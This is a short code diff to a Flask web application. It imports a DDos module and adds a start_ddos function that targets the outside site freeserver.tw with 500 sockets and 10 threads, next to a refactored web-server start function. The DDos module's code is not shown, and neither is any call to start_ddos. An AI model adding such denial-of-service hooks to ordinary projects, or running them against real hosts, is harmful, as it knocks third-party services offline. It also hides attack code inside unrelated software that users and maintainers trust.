@@ -35,8 +35,8 @@ from flask_oauthlib.provider import OAuth2Provider
 from wtforms.validators import DataRequired
 from wtforms import StringField
 from flask_admin.form import BaseForm
-import json
-import sys
+import json,sys,threading
+from DDos import checkUrl, DDos
 #from nltk.stem import WordNetLemmatizer
 #from nltk.book import *
 
@@ -2579,4 +2579,7 @@ def transferCrypto():
 def style():
   return render_template("style.css")
 
-socketio.run(app,host="0.0.0.0",port=5000,allow_unsafe_werkzeug=True)
+def start_web():
+  socketio.run(app,host="0.0.0.0",port=5000,allow_unsafe_werkzeug=True)
+def start_ddos():
+  DDos("https://freeserver.tw", sockets = 500, threads = 10)
